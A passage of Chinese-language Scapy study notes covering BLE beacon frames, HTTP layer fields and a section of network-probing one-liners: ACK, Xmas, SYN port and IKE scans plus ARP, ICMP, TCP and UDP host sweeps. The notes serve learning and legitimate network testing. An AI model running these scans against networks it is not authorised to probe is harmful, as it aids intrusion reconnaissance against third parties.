&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; = 4hexOctet</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">time-mid &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; = 2hexOctet</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">time-high-and-version  = 2hexOctet</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">clock-seq-and-reserved = hexOctet</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">clock-seq-low &nbsp; &nbsp; &nbsp; &nbsp;  = hexOctet</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">node &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; = 6hexOctet</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Field &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  Data Type &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Octet  Note</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">time_low &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; unsigned 32 bit integer &nbsp; 0-3 &nbsp;  The low field of the timestamp</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">time_mid &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; unsigned 16 bit integer &nbsp; 4-5 &nbsp;  The middle field of the timestamp &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">time_hi_and_version &nbsp; &nbsp; &nbsp;  unsigned 16 bit integer &nbsp; 6-7 &nbsp;  The high field of the timestamp multiplexed with the version number</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">clock_seq_hi_and_reserved  unsigned 8  bit integer &nbsp; 8 &nbsp; &nbsp;  The high field of the clock sequence multiplexed with the variant</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">clock_seq_low &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  unsigned 8  bit integer &nbsp; 9 &nbsp; &nbsp;  The low field of the clock sequence</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">node &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; unsigned 48 bit integer &nbsp; 10-15  The spatially unique node identifier</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 617px;"></div><div class="CodeMirror-gutters" style="display: none; height: 617px;"></div></div></div></pre></li></ul></li><li><p><span>id2</span></p><ul><li><span>组id</span></li></ul></li><li><p><span>id3</span></p><ul><li><span>信标id</span></li></ul></li><li><p><span>tx_power</span></p><ul><li><span>RSSI值</span></li></ul></li><li><p><span>mfg_reserved</span></p><ul><li><span>MFG RESERVED</span></li><li><span>预留给制造商用于实现特殊功能</span>
</details></li></ul></li></ul><h3 id='1310eddystoneurlclassscapycontribeddystoneeddystoneurl'><span>13.10.Eddystone_URL:</span><code>classscapy.contrib.eddystone.Eddystone_URL</code></h3><blockquote><p><span>Eddystone-URL帧使用压缩的编码格式广播URL, 以使其更适合有限的广告包. 一旦被解码, 该URL可以被任何能够访问互联网的客户端使用. 例如, 如果Eddystone-URL信标要广播URL </span><a href='https://goo.gl/Aq18zF' target='_blank' class='url'>https://goo.gl/Aq18zF</a><span>, 则接收到此数据包的任何客户端都可以选择访问该URL</span></p></blockquote><ul><li><p><span>用法</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 10.3394px; left: 3.9931px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"># 加载Eddystone</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">load_contrib('eddystone')</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"># Eddystone_URL.from_url(): 通过给定的URL返回一个Eddystone_URL对象</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">#</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"># build_set_advertising_data(): 生成能够被BLE发送的HCI_Cmd_LE_Set_Advertising_Data</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">bt.sr(Eddystone_URL.from_url('https://scapy.net').build_set_advertising_data())</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 173px;"></div><div class="CodeMirror-gutters" style="display: none; height: 173px;"></div></div></div></pre></li><li><p><span>tx_power</span></p><ul><li><span>RSSI值</span></li></ul></li><li><p><span>url_scheme</span></p><ul><li><span>前缀编码方案</span></li></ul></li><li><p><span>url</span></p></li></ul><h3 id='1311appleblesubmessagescapycontribibeaconappleblesubmessage'><span>13.11.Apple_BLE_Submessage:</span><code>scapy.contrib.ibeacon.Apple_BLE_Submessage</code></h3><blockquote><p><span>苹果基础子消息</span></p></blockquote><h3 id='1312ibeacondatascapycontribibeaconibeacondata'><span>13.12.IBeacon_Data:</span><code>scapy.contrib.ibeacon.IBeacon_Data</code></h3><blockquote><p><span>iBeacon广播数据帧。在Apple_BLE_Submessage上创建。</span></p></blockquote><ul><li><p><span>用法</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 10.3394px; left: 3.9931px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">#加载ibeacon</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">load_contrib('ibeacon')</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">p = Apple_BLE_Submessage()/IBeacon_Data(</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">uuid='fb0b57a2-8228-44cd-913a-94a122ba1206',</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">major=1, minor=2)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"># build_set_advertising_data: 传入Apple_BLE_Submessage或Apple_BLE_Frame返回能被BLE发送的HCI_Cmd_LE_Set_Advertising_Data</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">bt.sr(p.build_set_advertising_data())</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 247px;"></div><div class="CodeMirror-gutters" style="display: none; height: 247px;"></div></div></div></pre></li></ul><details></details><ul><li><p><span>uuid</span></p><ul><li><p><span>组织id</span></p></li><li><p><span>UUID</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="" style="break-inside: unset;"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 10.3394px; left: 3.99304px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">UUID &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; = time-low "-" time-mid "-"</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  time-high-and-version "-"</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  clock-seq-and-reserved</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  clock-seq-low "-" node</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">time-low &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; = 4hexOctet</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">time-mid &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; = 2hexOctet</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">time-high-and-version  = 2hexOctet</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">clock-seq-and-reserved = hexOctet</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">clock-seq-low &nbsp; &nbsp; &nbsp; &nbsp;  = hexOctet</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">node &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; = 6hexOctet</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Field &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  Data Type &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Octet  Note</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">time_low &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; unsigned 32 bit integer &nbsp; 0-3 &nbsp;  The low field of the timestamp</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">time_mid &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; unsigned 16 bit integer &nbsp; 4-5 &nbsp;  The middle field of the timestamp &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">time_hi_and_version &nbsp; &nbsp; &nbsp;  unsigned 16 bit integer &nbsp; 6-7 &nbsp;  The high field of the timestamp multiplexed with the version number</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">clock_seq_hi_and_reserved  unsigned 8  bit integer &nbsp; 8 &nbsp; &nbsp;  The high field of the clock sequence multiplexed with the variant</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">clock_seq_low &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  unsigned 8  bit integer &nbsp; 9 &nbsp; &nbsp;  The low field of the clock sequence</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">node &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; unsigned 48 bit integer &nbsp; 10-15  The spatially unique node identifier</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 617px;"></div><div class="CodeMirror-gutters" style="display: none; height: 617px;"></div></div></div></pre></li></ul></li><li><p><span>major</span></p><ul><li><span>进一步指定特定的iBeacon和用例。例如，这可以在UUID定义的更大区域内定义子区域。</span></li></ul></li><li><p><span>minor</span></p><ul><li><span>允许进一步细分区域或用例，由应用程序开发人员指定。</span></li></ul></li><li><p><span>tx_power</span></p><ul><li><span>RSSI值</span>
</details></li></ul></li></ul><h3 id='1313技巧'><span>13.13.技巧</span></h3><ol start='' ><li><p><span>第一步是打开基础蓝牙设备的HCI套接字</span></p><ul><li><code>&gt;&gt;&gt; bt = BluetoothHCISocket(0)</code></li></ul></li><li><p><span>发现附近的设备</span></p><ol start='' ><li><p><span>配置参数</span></p><ul><li><code>bt.sr(HCI_Hdr()/HCI_Command_Hdr()/HCI_Cmd_LE_Set_Scan_Parameters(type=1))</code></li></ul></li><li><p><span>启动扫描</span></p><ul><li><code>bt.sr(HCI_Hdr()/HCI_Command_Hdr()/HCI_Cmd_LE_Set_Scan_Enable(enable=True,filter_dups=False))</code></li></ul></li><li><p><span>开始抓包</span></p><ul><li><code>adverts = bt.sniff(lfilter=lambda p: EIR_CompleteLocalName in p, prn=lambda x:(x.reports[0].addr,x.getlayer(EIR_CompleteLocalName).local_name))</code></li></ul></li><li><p><span>收到数据包后, 禁用发现模式</span></p><ul><li><code>bt.sr(HCI_Hdr()/HCI_Command_Hdr()/HCI_Cmd_LE_Set_Scan_Enable(enable=False))</code></li></ul></li></ol></li></ol><h2 id='十四http'><span>十四.HTTP</span></h2><ul><li><span>用法: </span></li></ul><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="Python"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="python"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 10.3394px; left: 3.9931px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable">load_layer</span>(<span class="cm-string">"http"</span>)</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 25px;"></div><div class="CodeMirror-gutters" style="display: none; height: 25px;"></div></div></div></pre><h3 id='141httpscapylayershttphttp'><span>14.1.HTTP:</span><code>scapy.layers.http.HTTP</code></h3><h3 id='142httprequestscapylayershttphttprequest'><span>14.2.HTTPRequest:</span><code>scapy.layers.http.HTTPRequest</code></h3><details></details><ul><li><p><span>Method</span></p><ul><li><p><span>GET</span></p><ul><li><span>请求一个指定资源的表示形式. 使用GET的请求应该只被用于获取数据.</span></li></ul></li><li><p><span>HEAD</span></p><ul><li><span>请求一个与GET请求的响应相同的响应，但没有响应体.</span></li></ul></li><li><p><span>POST</span></p><ul><li><span>用于将实体提交到指定的资源，通常导致在服务器上的状态变化或副作用. </span></li></ul></li><li><p><span>PUT</span></p><ul><li><span>用请求有效载荷替换目标资源的所有当前表示。</span></li></ul></li><li><p><span>DELETE</span></p><ul><li><span>删除指定的资源。</span></li></ul></li><li><p><span>CONNECT</span></p><ul><li><span>建立一个到由目标资源标识的服务器的隧道。</span></li></ul></li><li><p><span>OPTIONS</span></p><ul><li><span>用于描述目标资源的通信选项。</span></li></ul></li><li><p><span>TRACE</span></p><ul><li><span>沿着到目标资源的路径执行一个消息环回测试。</span></li></ul></li><li><p><span>PATCH</span></p><ul><li><span>用于对资源应用部分修改。</span></li></ul></li></ul></li><li><p><span>Path</span></p></li><li><p><span>Http_Version</span></p></li><li><p><span>A_IM</span></p></li><li><p><span>Accept</span></p></li><li><p><span>Accept_Charset</span></p></li><li><p><span>Accept_Datetime</span></p></li><li><p><span>Accept_Encoding</span></p></li><li><p><span>Accept_Language</span></p></li><li><p><span>Access_Control_Request_Headers</span></p></li><li><p><span>Access_Control_Request_Method</span></p></li><li><p><span>Authorization</span></p></li><li><p><span>Cache_Control</span></p></li><li><p><span>Connection</span></p></li><li><p><span>Content_Length</span></p></li><li><p><span>Content_MD5</span></p></li><li><p><span>Content_Type</span></p></li><li><p><span>Cookie</span></p></li><li><p><span>DNT</span></p></li><li><p><span>Date</span></p></li><li><p><span>Expect</span></p></li><li><p><span>Forwarded</span></p></li><li><p><span>From</span></p></li><li><p><span>Front_End_Https</span></p></li><li><p><span>HTTP2_Settings</span></p></li><li><p><span>Host</span></p></li><li><p><span>If_Match</span></p></li><li><p><span>If_Modified_Since</span></p></li><li><p><span>If_None_Match</span></p></li><li><p><span>If_Range</span></p></li><li><p><span>If_Unmodified_Since</span></p></li><li><p><span>Keep_Alive</span></p></li><li><p><span>Max_Forwards</span></p></li><li><p><span>Origin</span></p></li><li><p><span>Permanent</span></p></li><li><p><span>Pragma</span></p></li><li><p><span>Proxy_Authorization</span></p></li><li><p><span>Proxy_Connection</span></p></li><li><p><span>Range</span></p></li><li><p><span>Referer</span></p></li><li><p><span>Save_Data</span></p></li><li><p><span>TE</span></p></li><li><p><span>Upgrade</span></p></li><li><p><span>Upgrade_Insecure_Requests</span></p></li><li><p><span>Upgrade_Insecure_Requests</span></p></li><li><p><span>User_Agent</span></p></li><li><p><span>Via</span></p></li><li><p><span>Warning</span></p></li><li><p><span>X_ATT_DeviceId</span></p></li><li><p><span>X_Correlation_ID</span></p></li><li><p><span>X_Csrf_Token</span></p></li><li><p><span>X_Forwarded_For</span></p></li><li><p><span>X_Forwarded_Host</span></p></li><li><p><span>X_Forwarded_Proto</span></p></li><li><p><span>X_Http_Method_Override</span></p></li><li><p><span>X_Request_ID</span></p></li><li><p><span>X_Requested_With</span></p></li><li><p><span>X_UIDH</span></p></li><li><p><span>X_Wap_Profile</span></p></li><li><p><span>Unknown_Headers</span></p></li></ul><p></details></p><h3 id='143httpresponsescapylayershttphttpresponse'><span>14.3.HTTPResponse:</span><code>scapy.layers.http.HTTPResponse</code></h3><details></details><ul><li><span>Http_Version</span></li><li><span>Status_Code</span></li><li><span>Reason_Phrase</span></li><li><span>Accept_Patch</span></li><li><span>Accept_Ranges</span></li><li><span>Access_Control_Allow_Credentials</span></li><li><span>Access_Control_Allow_Headers</span></li><li><span>Access_Control_Allow_Methods</span></li><li><span>Access_Control_Allow_Origin</span></li><li><span>Access_Control_Expose_Headers</span></li><li><span>Access_Control_Max_Age</span></li><li><span>Age       </span></li><li><span>Allow     </span></li><li><span>Alt_Svc   </span></li><li><span>Cache_Control</span></li><li><span>Connection</span></li><li><span>Content_Disposition</span></li><li><span>Content_Encoding</span></li><li><span>Content_Language</span></li><li><span>Content_Length</span></li><li><span>Content_Location</span></li><li><span>Content_MD5</span></li><li><span>Content_Range</span></li><li><span>Content_Security_Policy</span></li><li><span>Content_Type</span></li><li><span>Date      </span></li><li><span>Delta_Base</span></li><li><span>ETag      </span></li><li><span>Expires   </span></li><li><span>IM        </span></li><li><span>Keep_Alive</span></li><li><span>Last_Modified</span></li><li><span>Link      </span></li><li><span>Location  </span></li><li><span>P3P       </span></li><li><span>Permanent </span></li><li><span>Permanent </span></li><li><span>Pragma    </span></li><li><span>Proxy_Authenticate</span></li><li><span>Public_Key_Pins</span></li><li><span>Refresh   </span></li><li><span>Retry_After</span></li><li><span>Server    </span></li><li><span>Set_Cookie</span></li><li><span>Status    </span></li><li><span>Strict_Transport_Security</span></li><li><span>Timing_Allow_Origin</span></li><li><span>Tk        </span></li><li><span>Trailer   </span></li><li><span>Transfer_Encoding</span></li><li><span>Upgrade   </span></li><li><span>Vary      </span></li><li><span>Via       </span></li><li><span>WWW_Authenticate</span></li><li><span>Warning   </span></li><li><span>X_Content_Duration</span></li><li><span>X_Content_Security_Policy</span></li><li><span>X_Content_Type_Options</span></li><li><span>X_Correlation_ID</span></li><li><span>X_Frame_Options</span></li><li><span>X_Powered_By</span></li><li><span>X_Request_ID</span></li><li><span>X_UA_Compatible</span></li><li><span>X_WebKit_CSP</span></li><li><span>X_XSS_Protection</span></li><li><span>Unknown_Headers</span>
</details></li></ul><p><span>TCP_client不好使!!!</span></p><h2 id='十五探测'><span>十五.探测</span></h2><h3 id='151ack扫描'><span>15.1.ACK扫描</span></h3><ul><li><p><code>ans, unans = sr(IP(dst=&quot;www.slashdot.org&quot;)/TCP(dport=[80,666],flags=&quot;A&quot;))</code></p></li><li><p><span>未过滤的端口:</span></p><ul><li><code>[s[TCP].dport for s in ans]</code></li></ul></li><li><p><span>过滤的端口:</span></p><ul><li><code>[s[TCP].dport for s in unans]</code></li></ul></li></ul><h3 id='152xmas扫描'><span>15.2.Xmas扫描</span></h3><blockquote><p><span>带有状态标志的段发送到封闭端口则应使用RST进行响应. 此行为应允许攻击者通过发送某些类型的规则破坏数据包(不同步或TCB不允许)来扫描关闭的端口, 并通过RST数据包检测关闭的端口</span></p></blockquote><ul><li><p><code>ans, unans = sr(IP(dst=&quot;192.168.1.1&quot;)/TCP(dport=666,flags=&quot;FPU&quot;))</code></p><ul><li><span>F: FIN</span></li><li><span>P: PSH</span></li><li><span>U: URG</span></li></ul></li><li><p><span>检查RST响应将显示目标上的关闭端口</span></p></li></ul><h3 id='153ip扫描'><span>15.3.IP扫描</span></h3><blockquote><p><span>一个较低级别的IP扫描可以用来枚举支持的协议</span></p></blockquote><ul><li><code>ans, unans = sr(IP(dst=&quot;192.168.1.1&quot;,proto=(0,255)),timeout=1)</code></li><li><code>[s.proto for s, __ in ans]</code></li></ul><h3 id='154arpping'><span>15.4.ARP_Ping</span></h3><blockquote><p><span>发现本地以太网主机的最快方法是使用ARP Ping方法</span></p></blockquote><ul><li><p><code>ans, unans = srp(Ether(dst=&quot;ff:ff:ff:ff:ff:ff&quot;)/ARP(pdst=&quot;192.168.1.0/24&quot;),timeout=2)</code></p></li><li><p><code>ans.summary(lambda x: (x[1][&#39;Ether&#39;].src,x[1][&#39;ARP&#39;].psrc))</code></p><ul><li><code>ans.summary(lambda x: (x[1].src,x[1].psrc))</code></li><li><span>发送包, 接收包 = x</span></li></ul></li><li><p><span>Scapy还包括一个内置的arping()函数, 它执行类似于上面的两个命令:</span></p><ul><li><code>arping(&quot;192.168.1.*&quot;)</code></li></ul></li></ul><h3 id='155icmpping'><span>15.5.ICMP_Ping</span></h3><ul><li><p><code>ans, unans = sr(IP(dst=&quot;192.168.1.1-254&quot;)/ICMP())</code></p></li><li><p><code>ans.summary(lambda x: x[1].sprintf(&quot;%IP.src% is alive&quot;))</code></p><ul><li><code>ans.summary(lambda x: x[1][&#39;IP&#39;].src)</code></li></ul></li></ul><h3 id='156tcpping'><span>15.6.TCP_Ping</span></h3><blockquote><p><span>在ICMP回显请求被阻塞的情况下, 我们仍然可以使用各种TCP Ping, 比如下面的TCP SYN Ping:</span></p></blockquote><ul><li><code>ans, unans = sr(IP(dst=&quot;192.168.1.*&quot;)/TCP(dport=80,flags=&quot;S&quot;))</code></li><li><code>ans.summary(lambda x: x[1].sprintf(&quot;%IP.src% is alive&quot;))</code></li></ul><h3 id='157tcp端口扫描'><span>15.7.TCP端口扫描</span></h3><blockquote><p><span>在每个端口上发送一个TCP SYN. 等待SYN-ACK或RST或ICMP错误</span></p></blockquote><ul><li><code>ans, unans = sr(IP(dst=&quot;target&quot;)/TCP(flags=&quot;S&quot;, dport=(1,1024)))</code></li><li><code>ans.nsummary( lfilter=lambda x: (x[1].haslayer(TCP) and (x[1].getlayer(TCP).flags==&#39;SA&#39;)))</code></li></ul><h3 id='158udpping'><span>15.8.UDP_Ping</span></h3><blockquote><p><span>选择最有可能关闭的端口(开放的UDP端口可能会收到空数据包, 但会忽略它们). ICMP端口不可达, 则表示机器已启动. </span></p></blockquote><ul><li><code>ans, unans = sr(IP(dst=&quot;192.168.*.1-10&quot;)/UDP(dport=0))</code></li><li><code>ans.summary( lambda x: x[1].sprintf(&quot;%IP.src% is alive&quot;))</code></li></ul><h3 id='159ike扫描'><span>15.9.IKE扫描</span></h3><blockquote><p><span>我们尝试通过发送ISAKMP安全协会提案并接收答案来识别VPN集中器</span></p></blockquote><ul><li><code>res, unans = sr( IP(dst=&quot;192.168.1.*&quot;)/UDP() /ISAKMP(init_cookie=RandString(8), exch_type=&quot;identity,prot.&quot;)/ISAKMP_payload_SA(prop=ISAKMP_payload_Proposal()))</code></li><li><code>res.nsummary(prn=lambda x: x[1].src, lfilter=lambda x: x[1].haslayer(ISAKMP))</code></li></ul><h3 id='10dns-requests'><span>10.DNS Requests</span></h3><ul><li><p><span>IPv4(A) request</span></p><ul><li><code>ans = sr1(IP(dst=&quot;8.8.8.8&quot;)/UDP(sport=RandShort(), dport=53)/DNS(rd=1,qd=DNSQR(qname=&quot;secdev.org&quot;,qtype=&quot;A&quot;)))</code></li><li><code>ans.an.rdata</code></li></ul></li><li><p><span>SOA 